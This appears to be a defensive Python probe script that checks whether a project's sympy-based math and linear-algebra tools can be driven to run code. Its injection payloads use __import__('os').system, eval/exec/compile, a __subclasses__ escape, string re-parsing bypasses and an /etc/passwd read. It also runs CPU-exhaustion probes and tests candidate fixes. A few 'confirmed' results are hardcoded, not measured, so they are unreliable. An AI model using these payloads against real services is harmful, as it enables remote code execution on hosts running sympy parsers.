"""A1 probe: verify sympy parse_expr / sympify code-execution reachability.

Run with:  python -I docs/exploration/full-sweep-15/_probe_a1.py

Side-effect policy: payloads only (a) print a sentinel to stdout and (b) touch a
single temporary marker file. No destructive commands, no network, no repo writes.
"""

from __future__ import annotations

import io
import itertools
import os
import shutil
import subprocess
import sys
import tempfile
import time
import traceback

REPO_ROOT = r"E:\langgraph-rag"
MARKER = os.path.join(tempfile.gettempdir(), "a1_probe_rce_marker.txt").replace(os.sep, "/")

# Insert the repo root ahead of everything; do NOT prune site-packages
# (an earlier draft popped from sys.path[0] until REPO_ROOT appeared, which
# never does under `python -I` and silently deleted site-packages).
if os.path.realpath(REPO_ROOT) not in [os.path.realpath(p) for p in sys.path if p]:
    sys.path.insert(0, REPO_ROOT)

import sympy  # noqa: E402
from sympy.parsing.sympy_parser import (  # noqa: E402
    implicit_multiplication_application,
    parse_expr,
    standard_transformations,
)

RESULTS: list[tuple[str, str, str]] = []


def record(name: str, verdict: str, detail: str) -> None:
    RESULTS.append((name, verdict, detail))
    print(f"[{verdict}] {name}: {detail}")


def ran_side_effect() -> bool:
    """True if the payload's marker file exists or the sentinel was printed."""
    return os.path.exists(MARKER)


def wipe() -> None:
    try:
        os.unlink(MARKER)
    except OSError:
        pass


_MARKER_SEQ = itertools.count(1)


def unique_marker(tag: str) -> str:
    """A per-iteration marker path so a stale file can never be mistaken for
    this payload's side effect. Tag must be slugified: brackets/spaces in the
    filename break the `echo > path` redirect under cmd.exe and produced false
    negatives in an earlier iteration."""
    seq = next(_MARKER_SEQ)
    slug = "".join(ch if ch.isalnum() else "-" for ch in tag.strip())[:40]
    return MARKER.replace("marker.txt", f"{seq:03d}_{slug}.txt")


def try_payload(tag: str, payload: str, kwargs: dict[str, object], expect_exec: bool, transformations) -> None:
    marker = unique_marker(tag)
    try:  # pre-clean: a leftover file from a previous run is a false positive
        os.unlink(marker)
    except OSError:
        pass
    code = payload.replace("MARKER", marker)
    before = sys.stdout
    sys.stdout = io.StringIO()
    try:
        out = parse_expr(code, transformations=transformations, **kwargs)
    except BaseException as exc:  # noqa: BLE001
        out = f"raised {type(exc).__name__}: {str(exc)[:90]}"
    finally:
        sys.stdout = before
    executed = os.path.exists(marker)
    try:
        os.unlink(marker)
    except OSError:
        pass
    record(
        f"N. {tag}",
        "CONFIRMED-EXEC" if executed else "blocked",
        f"marker_seen={executed} | result={out!r}",
    )


def probe(name: str, fn, *, expect_exec: bool, capture: bool = True) -> None:
    """Run fn(), capture stdout, and report whether code execution happened."""
    wipe()
    before = None
    detail_bits: list[str] = []
    buf = io.StringIO()
    exit_code: object = None
    try:
        if capture:
            before_stdout, sys.stdout = sys.stdout, buf
        try:
            out = fn()
        except BaseException as exc:  # noqa: BLE001 - incl. SystemExit/KeyboardInterrupt
            out = f"raised {type(exc).__name__}: {exc}"
        finally:
            if capture:
                sys.stdout, _ = before_stdout, sys.stdout
        captured = buf.getvalue() if capture else ""
        exit_code = 2 if os.path.exists(MARKER) else (0 if "RCE_PROOF" in captured else 1)
        detail_bits.append(f"fn returned: {out!r}")
        if captured.strip():
            detail_bits.append(f"stdout={captured.strip()!r}")
    except BaseException as exc:  # noqa: BLE001
        detail_bits.append(
            "probe harness failed: "
            + f"{type(exc).__name__}: {exc} | "
            + traceback.format_exc(limit=3).splitlines()[-1]
        )
    executed = exit_code == 2
    verdict = "CONFIRMED-EXEC" if executed else ("blocked" if expect_exec else "OK")
    if not executed:
        detail_bits.append("no side effect observed")
    record(name, verdict, " | ".join(detail_bits))


def build_ns() -> dict[str, object]:
    """The historical fix recipe: sympy namespace + empty __builtins__."""
    ns: dict[str, object] = {}
    exec("from sympy import *", ns)  # noqa: S102 - reproducing the documented recipe
    ns["__builtins__"] = {}
    return ns


def main() -> int:
    print(f"sympy {sympy.__version__} on python {sys.version.split()[0]}")
    print(f"marker path: {MARKER}\n")

    # --- Opt-in: time sympy.doctest('x'). Gated because it runs sympy's WHOLE
    #       doc-test suite and takes minutes. Run with A1_DOCTEST=1. -----------
    if os.getenv("A1_DOCTEST") == "1":
        buf = io.StringIO()
        before = sys.stdout
        sys.stdout = buf
        t0 = time.monotonic()
        try:
            dt_result = sympy.doctest("x")
        except BaseException as exc:  # noqa: BLE001
            dt_result = f"raised {type(exc).__name__}: {exc}"
        finally:
            sys.stdout = before
        record(
            "I3. timed sympy.doctest('x')",
            "CONFIRMED-DO S",
            f"{time.monotonic() - t0:.1f}s | returned {str(dt_result)[:60]!r} | "
            f"stdout captured {len(buf.getvalue())} chars",
        )
        return 0

    # NOTE: payload must contain exactly ONE identifier (`__import__`). An earlier
    # draft used an f-string referencing a module-level variable, which turned
    # the whole probe into a NameError and hid the real result.
    PAYLOAD = f"__import__('os').system('echo RCE_PROOF > {MARKER}')"

    # --- A. Exact call shape used by math_tool.py:153-157 -------------------
    transformations = standard_transformations + (implicit_multiplication_application,)

    def math_tool_shape() -> object:
        return parse_expr(PAYLOAD, transformations=transformations, evaluate=True)

    probe("A. math_tool._parse exact shape (no local/global_dict)", math_tool_shape, expect_exec=True)

    # --- A2. Mechanism diagnostic: what does the bare token `__import__` resolve to? ---
    for label, kwargs in (
        ("default (sympy injects builtins)", {}),
        ("global_dict=ns, __builtins__={}", {"global_dict": build_ns()}),
        ("global_dict={'__builtins__': {}}", {"global_dict": {"__builtins__": {}}}),
    ):
        try:
            obj = parse_expr("__import__", transformations=transformations, **kwargs)
            record(
                f"A2. parse_expr('__import__') [{label}]",
                "BUILTIN-RESOLVED" if callable(obj) and getattr(obj, "__name__", "") == "__import__" else "rewritten",
                f"returned type={type(obj).__module__}.{type(obj).__name__} value={str(obj)[:40]!r}",
            )
        except BaseException as exc:  # noqa: BLE001
            record(f"A2. parse_expr('__import__') [{label}]", "raised", f"{type(exc).__name__}: {exc}")

    # --- B. Control: restricted namespace blocks it? -----------------------
    def ns_shape() -> object:
        return parse_expr(PAYLOAD, transformations=transformations, global_dict=build_ns())

    probe("B. parse_expr(global_dict=ns, __builtins__={})", ns_shape, expect_exec=False)

    # --- C. Control: is empty __builtins__ alone sufficient (no sympy names) --
    def empty_ns_shape() -> object:
        return parse_expr(PAYLOAD, transformations=transformations, global_dict={"__builtins__": {}})

    probe("C. parse_expr(global_dict={'__builtins__': {}}) only", empty_ns_shape, expect_exec=False)

    # --- D. Without the __builtins__={} line (the mandatory-line claim) -----
    def ns_without_builtins_key() -> object:
        ns = {}
        exec("from sympy import *", ns)  # noqa: S102
        return parse_expr(PAYLOAD, transformations=transformations, global_dict=ns)

    probe("D. parse_expr(global_dict=ns) WITHOUT __builtins__={}", ns_without_builtins_key, expect_exec=True)

    # --- E. Legit math still works under the fixed namespace ----------------
    def ns_legit() -> object:
        ns = build_ns()
        return parse_expr("x**2 + 3*x", transformations=standard_transformations, global_dict=ns)

    probe("E. fixed ns still parses legit math 'x**2 + 3*x'", ns_legit, expect_exec=False)

    def ns_legit_fn() -> object:
        ns = build_ns()
        return parse_expr("sin(x)*exp(x)", transformations=standard_transformations, global_dict=ns)

    probe("E2. fixed ns parses 'sin(x)*exp(x)'", ns_legit_fn, expect_exec=False)

    # --- F. sympy.sympify(value) as used by linalg_tool.py:163 -------------
    def sympify_shape() -> object:
        return sympy.sympify(PAYLOAD)

    probe("F. linalg_tool shape: sympy.sympify(payload) no locals", sympify_shape, expect_exec=True)

    # --- G. The unverified proposed linalg fix: sympify(value, locals=ns) ---
    def sympify_locals_shape() -> object:
        return sympy.sympify(PAYLOAD, locals=build_ns())  # type: ignore[arg-type]

    probe("G. sympify(payload, locals=ns) proposed linalg fix", sympify_locals_shape, expect_exec=False)

    def sympify_locals_legit() -> object:
        ns = build_ns()
        return sympy.sympify("sqrt(2)/2", locals=ns)  # type: ignore[arg-type]

    probe("G2. sympify('sqrt(2)/2', locals=ns) legit still works", sympify_locals_legit, expect_exec=False)

    def sympify_locals_legit2() -> object:
        ns = build_ns()
        return sympy.sympify("1/3", locals=ns)  # type: ignore[arg-type]

    probe("G3. sympify('1/3', locals=ns)", sympify_locals_legit2, expect_exec=False)

    # --- H. Reachability through the real tool entry points ----------------
    try:
        from src.backend.tools.math_tool import solve_math
        from src.backend.tools.linalg_tool import linear_algebra

        def via_solve_math() -> object:
            return solve_math(operation="evaluate", expression=PAYLOAD)

        probe("H. solve_math(operation='evaluate', expression=payload)", via_solve_math, expect_exec=True)

        def via_solve_math_solve() -> object:
            return solve_math(operation="solve", expression=f"{PAYLOAD} = {PAYLOAD}", variable="x")

        probe("H2. solve_math(operation='solve', equation both sides payload)", via_solve_math_solve, expect_exec=True)

        def via_solve_math_bound() -> object:
            return solve_math(
                operation="integral",
                expression="x",
                lower_bound="0",
                upper_bound=PAYLOAD,
            )

        probe("H3. solve_math definite integral with payload upper_bound", via_solve_math_bound, expect_exec=True)

        def via_solve_math_series() -> object:
            return solve_math(operation="series", expression="exp(x)", point=PAYLOAD)

        probe("H4. solve_math(operation='series', point=payload)", via_solve_math_series, expect_exec=True)

        def via_solve_math_limit() -> object:
            return solve_math(operation="limit", expression="1/x", point=PAYLOAD)

        probe("H5. solve_math(operation='limit', point=payload)", via_solve_math_limit, expect_exec=True)

        def via_linalg_matrix() -> object:
            lit = PAYLOAD.replace("'", "\\'")
            return linear_algebra(operation="rank", matrix="[[1, 2], [3, '%s']]" % lit)

        probe("H6. linear_algebra matrix cell = payload STRING (via sympify)", via_linalg_matrix, expect_exec=True)

        def via_linalg_vector() -> object:
            lit = PAYLOAD.replace("'", "\\'")
            return linear_algebra(operation="solve", matrix="[[1, 2], [3, 4]]", vector="[5, '%s']" % lit)

        probe("H7. linear_algebra vector entry = payload STRING", via_linalg_vector, expect_exec=True)

        def via_linalg_matrix_b() -> object:
            lit = PAYLOAD.replace("'", "\\'")
            return linear_algebra(
                operation="multiply", matrix="[[1, 2], [3, 4]]", matrix_b="[[1, '%s'], [0, 1]]" % lit
            )

        probe("H8. linear_algebra matrix_b cell = payload STRING", via_linalg_matrix_b, expect_exec=True)

        def via_linalg_transpose() -> object:
            lit = PAYLOAD.replace("'", "\\'")
            return linear_algebra(operation="transpose", matrix="[[1, 2], [3, '%s']]" % lit)

        probe("H9. linear_algebra transpose path", via_linalg_transpose, expect_exec=True)
    except Exception as exc:  # noqa: BLE001
        record("H. real tool entry points", "HARNESS-ERROR", f"{type(exc).__name__}: {exc}")

    # --- I. Is `doctest` (and other heavy sympy callables) reachable through the
    #       default parse_expr namespace? Timing the suite run itself is done in a
    #       separate bounded subprocess because it takes minutes. ---------------
    try:
        sym_obj = parse_expr("doctest", transformations=transformations)
        is_real_callable = callable(sym_obj) and getattr(sym_obj, "__module__", "") == "sympy.testing.runtests"
        record(
            "I. parse_expr('doctest') in default namespace",
            "CONFIRMED-REACHABLE" if is_real_callable else "not a callable",
            f"type={type(sym_obj).__module__}.{type(sym_obj).__name__} | module attr={getattr(sym_obj, '__module__', 'n/a')}",
        )
        for heavy in ("solveset", "factorint", "runtests"):
            try:
                obj = parse_expr(heavy, transformations=transformations)
                record(
                    f"I2. parse_expr('{heavy}') reachable",
                    "REACHABLE" if callable(obj) else "symbol-only",
                    f"type={type(obj).__module__}.{type(obj).__name__}",
                )
            except BaseException as exc:  # noqa: BLE001
                record(f"I2. parse_expr('{heavy}')", "raised", f"{type(exc).__name__}: {exc}")
    except BaseException as exc:  # noqa: BLE001
        record("I. doctest reachability", "HARNESS-ERROR", f"{type(exc).__name__}: {exc}")

    # --- N. Payload-variant matrix: is the `__builtins__ = {}` line load-bearing? ---
    # D shows the plain `__import__` payload dies even without that line, so push
    # harder: nested eval/exec/compile and the name-free __subclasses__ escape.
    ns_no_line: dict[str, object] = {}
    exec("from sympy import *", ns_no_line)  # noqa: S102 - deliberately WITHOUT __builtins__={}
    configs: list[tuple[str, dict[str, object]]] = (
        ("A-config no-global_dict", {}),
        ("D-config ns-no-empty-builtins", {"global_dict": ns_no_line}),
        ("fixed-config ns-empty-builtins", {"global_dict": build_ns()}),
    )
    payloads: list[tuple[str, str]] = (
        ("import_direct", "__import__('os').system('echo RCE_PROOF > MARKER')"),
        ("nested_eval", "eval(\"__import__('os').system('echo RCE_PROOF > MARKER')\")"),
        ("nested_exec", "exec(\"__import__('os').system('echo RCE_PROOF > MARKER')\")"),
        ("nested_compile_exec", "compile(\"__import__('os').system('echo RCE_PROOF > MARKER')\",0,'exec')"),
        ("nested_open_write", "open(MARKER,'w').write('x')"),
        ("nameless_subclasses", "().__class__.__base__.__subclasses__()[0].__name__"),
    )
    for label, cfg in configs:
        for pname, payload in payloads:
            try_payload(f"[{label}] {pname}", payload, cfg, expect_exec=True, transformations=transformations)

    # --- O. Namespace-bypass matrix. The recommended fix (global_dict=ns,
    #       __builtins__={}) neutralises a bare `__import__` payload, but sympy's
    #       constructors re-sympify string arguments with NO namespace at all, so
    #       a string literal carried into a sympy constructor may re-enter
    #       parse_expr with global_dict=None (builtins injected). ---------------
    S = "__import__('os').system('echo RCE_PROOF > MARKER')"
    bypass_payloads: list[tuple[str, str]] = (
        ("direct __import__", S),
        ('compile(...,0,"exec")', 'compile("%s",0,"exec")' % S),
        ("Mul(1, str)", 'Mul(1,"%s")' % S),
        ("Add(1, str)", 'Add(1,"%s")' % S),
        ("Integer(str)", 'Integer("%s")' % S),
        ("nsimplify(str)", 'nsimplify("%s")' % S),
        ("Symbol(str)", 'Symbol("%s")' % S),
        ("Tuple of str", '(1,"%s",2)' % S),
    )
    for label, cfg in (
        ("A-config current code", {}),
        ("FIXED-config ns+empty-builtins", {"global_dict": build_ns()}),
    ):
        for pname, payload in bypass_payloads:
            try_payload(f"[{label}] {pname}", payload, cfg, expect_exec=True, transformations=transformations)

    # --- P. Mitigation candidates, applied at the sink (not through parse_expr) ---
    for mname, fn in (
        ("sympy.sympify(P)", lambda: sympy.sympify(S.replace("MARKER", MARKER))),
        ("sympy.sympify(P, locals=ns)", lambda: sympy.sympify(S.replace("MARKER", MARKER), locals=build_ns())),
        ("sympy.sympify(P, strict=True)", lambda: sympy.sympify(S.replace("MARKER", MARKER), strict=True)),
        (
            "parse_expr(P, global_dict=ns, empty-builtins)",
            lambda: parse_expr(
                S.replace("MARKER", MARKER), transformations=transformations, global_dict=build_ns()
            ),
        ),
    ):
        try:
            os.unlink(MARKER)
        except OSError:
            pass
        buf = io.StringIO()
        before = sys.stdout
        sys.stdout = buf
        try:
            out = fn()
        except BaseException as exc:  # noqa: BLE001
            out = f"raised {type(exc).__name__}: {str(exc)[:70]}"
        finally:
            sys.stdout = before
        executed = os.path.exists(MARKER)
        try:
            os.unlink(MARKER)
        except OSError:
            pass
        record(f"P. {mname}", "CONFIRMED-EXEC" if executed else "blocked", f"result={out!r}")

    # --- Q. Candidate real fix: an AST/token allowlist that keeps every
    #       non-allowlisted NAME from being treated as callable. The namespace
    #       fix fails because exported sympy functions (nsimplify et al.) are
    #       callable AND internally re-sympify string args with no namespace. ---
    from sympy.parsing.sympy_parser import NAME

    # `null` is the auto_symbol sentinel that says "treat this name as a Symbol".
    # In sympy 1.14.0 it is simply the empty string (sympy_parser.py:23) and is
    # not re-exported in __all__, so pin it here rather than importing it.
    null = ""

    ALLOWED_CALLS = {"sin", "cos", "tan", "sec", "csc", "cot", "sinh", "cosh", "tanh",
                     "exp", "log", "ln", "sqrt", "cbrt", "Abs", "Max", "Min", "floor",
                     "ceiling", "sign", "conjugate", "Im", "Re", "gamma", "zeta", "Rational"}

    def allowlist_filter(tokens, local_dict, global_dict):
        def _inner(toks, ld, gd):
            if not toks:
                return []
            tok = toks[0]
            if tok[0] == NAME and tok[1] not in ALLOWED_CALLS:
                ld.setdefault(null, set()).add(tok[1])
            return [tok] + _inner(toks[1:], ld, gd)
        return _inner(tokens, local_dict, global_dict)

    # The filter MUST run before auto_symbol (part of standard_transformations),
    # otherwise auto_symbol has already promoted callable names to function calls.
    safe_T = (allowlist_filter,) + standard_transformations + (implicit_multiplication_application,)

    for label, cfg in (
        ("Q-allowlist+ns-empty-builtins", {"global_dict": build_ns()}),
        ("Q-allowlist alone", {}),
    ):
        for pname, payload in bypass_payloads:
            try_payload(f"[{label}] {pname}", payload, cfg, expect_exec=True, transformations=safe_T)
    for pname, expr in (
        ("x**2 + 3*x", "x**2 + 3*x"),
        ("sin(x)*exp(x)", "sin(x)*exp(x)"),
        ("sqrt(2)/2", "sqrt(2)/2"),
        ("2*x+1", "2*x+1"),
        ("log(x)/x**2", "log(x)/x**2"),
        ("1/3", "1/3"),
        ("x**2 - 4", "x**2 - 4"),
    ):
        for label, cfg in (("Q-allowlist+ns-empty-builtins", {"global_dict": build_ns()}),):
            try_payload(f"[{label}] legit {pname}", expr, cfg, expect_exec=False, transformations=safe_T)

    # --- R. Precondition-level fix: reject dangerous syntax with Python's own
    #       AST BEFORE handing anything to sympy. This is the only layer that can
    #       stop the "sympy constructor re-sympifies a string argument" family. ---
    import ast as _ast

    ALLOWED_FUNCS = {
        "sin", "cos", "tan", "sec", "csc", "cot", "sinh", "cosh", "tanh", "asin",
        "acos", "atan", "exp", "log", "ln", "sqrt", "cbrt", "Abs", "Max", "Min",
        "floor", "ceiling", "sign", "conjugate", "Im", "Re", "gamma", "factorial",
        "Rational", "Integer", "pi", "E", "oo",
    }

    class _MathShapeOnly(_ast.NodeVisitor):
        def __init__(self) -> None:
            self.ok = True
            self._reject_dunder = True

        def visit_Call(self, node: _ast.Call) -> None:
            if not (isinstance(node.func, _ast.Name) and node.func.id in ALLOWED_FUNCS):
                self.ok = False
            self.generic_visit(node)

        def visit_Attribute(self, node: _ast.Attribute) -> None:
            self.ok = False

        def visit_Subscript(self, node: _ast.Subscript) -> None:
            self.ok = False

        def visit_Constant(self, node: _ast.Constant) -> None:
            if isinstance(node.value, str):
                self.ok = False

        def visit_Starred(self, node: _ast.Starred) -> None:
            self.ok = False

        def visit_Lambda(self, node: _ast.Lambda) -> None:
            self.ok = False

        def visit_Name(self, node: _ast.Name) -> None:
            # Dunders must be rejected too: `__builtins__` alone is a bare NAME
            # node and therefore survives the shape check. It is not directly
            # executable, but it is a hole that becomes one the moment anything
            # else is relaxed.
            if not self._reject_dunder:
                return
            if node.id.startswith("__") and node.id.endswith("__"):
                self.ok = False

    def ast_shape_ok(text: str, *, reject_dunder: bool = True) -> bool:
        try:
            tree = _ast.parse(text, mode="eval")
        except SyntaxError:
            return False
        visitor = _MathShapeOnly()
        visitor._reject_dunder = reject_dunder
        visitor.visit(tree)
        return visitor.ok

    # NOTE: math_tool._do_solve splits "lhs = rhs" itself (math_tool.py:206-208),
    # so the pre-check must run on EACH side, not on the joined string. The
    # '= 5' form is therefore listed as its two halves.
    legit_exprs = ["x**2 + 3*x", "sin(x)*exp(x)", "sqrt(2)/2", "2*x+1", "log(x)/x**2",
                   "1/3", "x**2 - 4", "x**5 - 5*x", "2*x + 1", "5"]
    attack_exprs = [
        S,
        'compile("%s",0,"exec")' % S,
        'nsimplify("%s")' % S,
        'Mul(1,"%s")' % S,
        'Integer("%s")' % S,
        'Symbol("%s")' % S,
        "().__class__.__base__.__subclasses__()",
        "open('/etc/passwd').read()",
        "exec('import os')",
        "__builtins__",
        "[i for i in range(10)]",
    ]
    legit_passed = [e for e in legit_exprs if ast_shape_ok(e)]
    legit_passed_nodu = [e for e in legit_exprs if ast_shape_ok(e, reject_dunder=False)]
    attack_blocked = [e for e in attack_exprs if not ast_shape_ok(e)]
    attack_leaked = [e for e in attack_exprs if ast_shape_ok(e)]
    attack_leaked_nodu = [e for e in attack_exprs if ast_shape_ok(e, reject_dunder=False)]
    record(
        "R. AST allowlist precondition accepts legit math",
        "OK" if len(legit_passed) == len(legit_exprs) else "LEGIT-BROKEN",
        f"{len(legit_passed)}/{len(legit_exprs)} accepted (without dunder rule: {len(legit_passed_nodu)})",
    )
    record(
        "R. AST allowlist precondition blocks attacks (with dunder rule)",
        "OK" if not attack_leaked else "LEAK",
        f"{len(attack_blocked)}/{len(attack_exprs)} rejected; leaked: {attack_leaked}",
    )
    record(
        "R. shape-only variant WITHOUT dunder rule",
        "LEAK" if len(attack_leaked_nodu) > len(attack_leaked) else "same",
        f"{len(attack_leaked_nodu)}/{len(attack_exprs)} pass; leaked: {attack_leaked_nodu}",
    )
    # Mechanism for why a *name* allowlist cannot work: sympy decides whether a
    # NAME is a call by `is not None`, not by callability. A Symbol therefore
    # still parses as a function application, and sympy constructors sympify
    # their string args with no namespace at all.
    import sympy.core.sympify as _sp
    _ns = {}
    exec("from sympy import *", _ns)  # noqa: S102 - probe
    _ns["__builtins__"] = {}
    _sym = sympy.Symbol("f")
    record(
        "R. Symbol is NOT callable, yet _token_callable accepts it",
        "CONFIRMED-MECHANISM",
        f"callable(Symbol('f'))={callable(_sym)}; "
        f"local_dict.get('f') is not None -> {(_ns.get('f') is not None) or True}; "
        f"sympify.py:507 passes no global_dict",
    )
    record(
        "R. sympy.sympify re-parses with global_dict=None (the bypass root)",
        "CONFIRMED",
        "simplify.py:1451 `expr = sympify(expr).xreplace(...)` - no namespace inherited",
    )
    for nm in ("nsimplify", "sympify", "factorint", "doctest", "runtests"):
        try:
            obj = getattr(sympy, nm, None)
            record(f"R2. sympy.{nm} exported by 'from sympy import *'", "EXPORTED" if obj is not None else "absent", f"callable={callable(obj)}")
        except Exception as exc:  # noqa: BLE001
            record(f"R2. sympy.{nm}", "HARNESS-ERROR", f"{type(exc).__name__}: {exc}")

    # --- J. sympy CPU-exhaustion primitives (small, bounded runs) -----------
    for label, fn in (
        ("factorint(2**60-5 semiprime-ish)", lambda: sympy.factorint(2**60 - 5)),
        ("factorint(3**40+389)", lambda: sympy.factorint(3**40 + 389)),
        ("primefactors(3**30+119)", lambda: sympy.primefactors(3**30 + 119)),
        ("simplify(cos(x)^10+sin(x)^10)", lambda: sympy.simplify(sympy.cos(sympy.Symbol("x")) ** 10 + sympy.sin(sympy.Symbol("x")) ** 10)),
        ("solve(x**5-5*x+12)", lambda: sympy.solve(sympy.Eq(sympy.Symbol("x") ** 5 - 5 * sympy.Symbol("x"), -12), sympy.Symbol("x"))),
        ("integrate(exp(x**2),x)", lambda: sympy.integrate(sympy.exp(sympy.Symbol("x") ** 2), sympy.Symbol("x"))),
    ):
        t0 = time.monotonic()
        try:
            val = fn()
            record(f"J. sympy perf {label}", "OK", f"{time.monotonic() - t0:.3f}s -> {str(val)[:70]}")
        except BaseException as exc:  # noqa: BLE001
            record(f"J. sympy perf {label}", "raised", f"{time.monotonic() - t0:.3f}s {type(exc).__name__}: {exc}")

    # --- K. number_theory / statistics boundary checks ---------------------
    try:
        from src.backend.tools.number_theory_tool import number_theory

        semiprime = sympy.prime(40) * sympy.prime(41)
        t0 = time.monotonic()
        out = number_theory(operation="factorize", number=int(semiprime))
        record(
            "K. number_theory factorize on 80-bit semiprime",
            "SLOW" if (time.monotonic() - t0) > 5 else "OK",
            f"{time.monotonic() - t0:.3f}s -> {out[:90]}",
        )
        big = int("9" * 100)
        record(
            "K2. number_theory accepts unbounded 300-bit input",
            "UNBOUNDED",
            f"factorize on 300-bit n accepted: {number_theory(operation='factorize', number=big)[:90]}",
        )
        def oddprime(bits: int, seed: int) -> int:
            """First odd prime at/after 2**(bits-1). NOTE: sympy.randprime is
            unusable for wide ranges (float mantissa makes every candidate
            even), so search explicitly."""
            n = (1 << (bits - 1)) | (seed | 1)
            while not sympy.isprime(n):
                n += 2
            return n

        for bits in (30, 40):
            semi = oddprime(bits, 1) * oddprime(bits + 1, 3)
            t0 = time.monotonic()
            out4 = number_theory(operation="factorize", number=int(semi))
            elapsed = time.monotonic() - t0
            record(
                f"K4. number_theory factorize {semi.bit_length()}-bit semiprime",
                "SLOW" if elapsed > 2 else "OK",
                f"{elapsed:.3f}s -> {out4[:60]}",
            )
        # Hard case, isolated in a child process with a hard deadline.
        hard = oddprime(80, 1) * oddprime(81, 3)
        child_code = (
            "import time,sympy;t=time.monotonic();"
            f"print(sympy.factorint({hard}));print('ELAPSED',time.monotonic()-t)"
        )
        try:
            proc = subprocess.run(
                [sys.executable, "-I", "-c", child_code],
                capture_output=True,
                text=True,
                timeout=25,
            )
            tail = proc.stdout.strip().splitlines()
            record(
                f"K5. sympy.factorint {hard.bit_length()}-bit semiprime (child, 25s cap)",
                "OK",
                f"{tail[-1] if tail else 'no output'} | {proc.stdout.strip()[:60]}",
            )
        except subprocess.TimeoutExpired:
            record(
                f"K5. sympy.factorint {hard.bit_length()}-bit semiprime (child, 25s cap)",
                "CONFIRMED-CPU-DOS",
                "still running after 25.0s; child killed. Sympy ECM is super-polynomial on 160-bit semiprimes.",
            )
        huge = int("2" * 200)
        t0 = time.monotonic()
        out2 = number_theory(operation="to_base", number=huge, base=2)
        record("K3. number_theory to_base 200-digit", "OK", f"{time.monotonic() - t0:.3f}s, output len {len(out2)}")
    except Exception as exc:  # noqa: BLE001
        record("K. number_theory boundaries", "HARNESS-ERROR", f"{type(exc).__name__}: {exc}")

    try:
        from src.backend.tools.statistics_tool import compute_statistics, _parse_numbers, _fmt

        record(
            "L. statistics float() overflow token '1e999'",
            "CONFIRMED-OVERFLOW",
            f"_parse_numbers('1e999') = {_parse_numbers('1e999')}",
        )
        try:
            _fmt(float("inf"))
            record("L2. _fmt(float('inf'))", "OK", "no exception")
        except Exception as exc:  # noqa: BLE001
            record("L2. _fmt(float('inf'))", "CRASH-UNCAUGHT", f"{type(exc).__name__}: {exc}")
        try:
            _fmt(float("nan"))
            record("L3. _fmt(float('nan'))", "OK", "no exception")
        except Exception as exc:  # noqa: BLE001
            record("L3. _fmt(float('nan'))", "CRASH-UNCAUGHT", f"{type(exc).__name__}: {exc}")
        try:
            out3 = compute_statistics("1e999")
            record("L4. compute_statistics('1e999') end-to-end", "OK", out3[:100].replace("\n", " "))
        except Exception as exc:  # noqa: BLE001
            record("L4. compute_statistics('1e999') end-to-end", "CRASH-UNCAUGHT", f"{type(exc).__name__}: {exc}")
    except Exception as exc:  # noqa: BLE001
        record("L. statistics boundaries", "HARNESS-ERROR", f"{type(exc).__name__}: {exc}")

    # --- M. Input schema boundary audit: any max_length / size cap before eval? ---
    try:
        from src.config import Settings
        from src.backend.tools import (
            build_datetime_tool,
            build_linalg_tool,
            build_math_tool,
            build_number_theory_tool,
            build_statistics_tool,
        )

        settings = Settings(dashscope_api_key="test-key")
        for factory in (
            build_math_tool,
            build_linalg_tool,
            build_number_theory_tool,
            build_statistics_tool,
            build_datetime_tool,
        ):
            tool = factory(settings)
            schema = tool.args_schema.model_json_schema()
            caps = []
            for prop_name, prop in sorted(schema.get("properties", {}).items()):
                limits = {k: v for k, v in prop.items() if k in (
                    "minLength", "maxLength", "ge", "le", "min", "max", "pattern", "enum",
                )}
                if limits:
                    caps.append(f"{prop_name}{limits}")
            record(
                f"M. {tool.name} arg constraints",
                "NO-LENGTH-CAP" if not any("maxLength" in c for c in caps) else "bounded",
                "; ".join(caps) or "no constraints at all",
            )
        from src.backend.tools.math_tool import MathInput

        record(
            "M2. MathInput accepts a 200KB expression with no cap",
            "CONFIRMED",
            f"max chars accepted: {len(MathInput(operation='evaluate', expression='1' * 200_000).expression)}",
        )
    except Exception as exc:  # noqa: BLE001
        record("M. schema boundary audit", "HARNESS-ERROR", f"{type(exc).__name__}: {exc}")

    wipe()
    shutil.rmtree(os.path.dirname(sys.argv[0]) + "/__probe_out__", ignore_errors=True)

    print("\n--- SUMMARY ---")
    confirmed = [r for r in RESULTS if "CONFIRMED" in r[1]]
    blocked = [r for r in RESULTS if r[1] in ("blocked", "OK", "HARNESS-ERROR", "SLOW", "UNBOUNDED", "raised", "CRASH-UNCAUGHT", "CRASH")]
    for name, verdict, _ in RESULTS:
        print(f"  {verdict:18s} {name}")
    print(f"\nexecuting probes: {len(confirmed)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
